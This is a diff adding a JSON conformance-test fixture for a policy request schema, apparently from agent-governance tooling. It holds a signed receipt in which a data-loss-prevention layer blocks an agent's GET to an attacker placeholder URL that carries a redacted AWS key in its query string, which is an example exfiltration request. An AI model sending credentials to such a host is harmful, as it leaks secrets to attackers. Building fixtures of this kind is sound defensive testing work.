@@ -1,0 +1,39 @@
+{
+  "action_type": "read",
+  "binding": {},
+  "claim": "Receiver may use the downstream claim only when the frozen evidence policy passes.",
+  "evidence": [],
+  "request_id": "case-04-native-block",
+  "schema": "openline.proof_to_policy.request.v0.2",
+  "source_receipts": [
+    {
+      "action_record": {
+        "action_id": "conformance-00000",
+        "action_type": "read",
+        "actor": "agent:conformance-runner",
+        "chain_prev_hash": "genesis",
+        "chain_seq": 0,
+        "delegation_chain": [
+          "test-policy-v1",
+          "test-grant"
+        ],
+        "layer": "dlp",
+        "method": "GET",
+        "pattern": "api_key_aws",
+        "policy_hash": "sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+        "principal": "org:conformance-test",
+        "reversibility": "full",
+        "severity": "critical",
+        "side_effect_class": "external_read",
+        "target": "https://attacker.example.net/exfil?key=AKIA...REDACTED",
+        "timestamp": "2026-04-15T12:00:00Z",
+        "transport": "https",
+        "verdict": "block",
+        "version": 1
+      },
+      "signature": "ed25519:aa0d02932f9566de8eecc2a4de119e96cdb7743c7f50f54f52578dccd2ecc805f26b9602747275e657078af07e0fde4bcb61251906655d580e34d777f7408a04",
+      "signer_key": "890726e93f89e773fb3b4298271245a69c1884fd1003846c3358b8b65a2288fa",
+      "version": 1
+    }
+  ]
+}
